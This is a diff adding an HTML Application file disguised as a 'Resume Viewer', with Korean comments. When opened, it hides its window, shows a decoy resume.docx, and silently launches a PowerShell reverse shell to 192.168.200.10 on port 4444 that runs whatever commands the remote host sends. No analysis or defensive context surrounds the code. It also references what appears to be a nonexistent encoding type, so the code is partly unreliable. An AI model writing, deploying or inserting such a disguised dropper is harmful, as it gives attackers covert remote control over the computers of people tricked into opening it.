@@ -1,0 +1,43 @@
+<html>
+<head>
+<title>Resume Viewer</title>
+<hta:application 
+    id="oHTA"
+    applicationname="ResumeViewer"
+    border="none"
+    caption="no"
+    showintaskbar="no"
+    windowstyle="hidden"
+/>
+
+<!-- 에러가 덜 나고 문자열 처리가 정교한 JavaScript로 교체 -->
+<script language="JavaScript">
+    window.resizeTo(0, 0);
+    window.moveTo(-2000, -2000);
+
+    function Window_OnLoad() {
+        var shell = new ActiveXObject("WScript.Shell");
+        var fso = new ActiveXObject("Scripting.FileSystemObject");
+        var localPath = shell.CurrentDirectory;
+        
+        // 1. 위장용 문서 열기
+        var docxPath = localPath + "\\resources\\resume.docx";
+        if (fso.FileExists(docxPath)) {
+            shell.Run("cmd.exe /c start \"\" \"" + docxPath + "\"", 0, false);
+        }
+        
+        // 2. 가독성을 위해 개행(줄바꿈) 없이 한 줄로 완벽히 정리한 파워쉘 리버스 셸 명령어
+        var cmd = "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"$c=New-Object System.Net.Sockets.TCPClient('192.168.200.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};$i=(New-Object System.Net.AsciiEncoding).GetString($b,0,$b.Length);while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Net.AsciiEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$t=$sb+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($t);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"";
+              
+        // 3. 백그라운드로 실행 후 창 즉시 닫기
+        shell.Run(cmd, 0, false);
+        window.close();
+    }
+    
+    // 로드 시 함수 실행
+    window.onload = Window_OnLoad;
+</script>
+</head>
+<body>
+</body>
+</html>
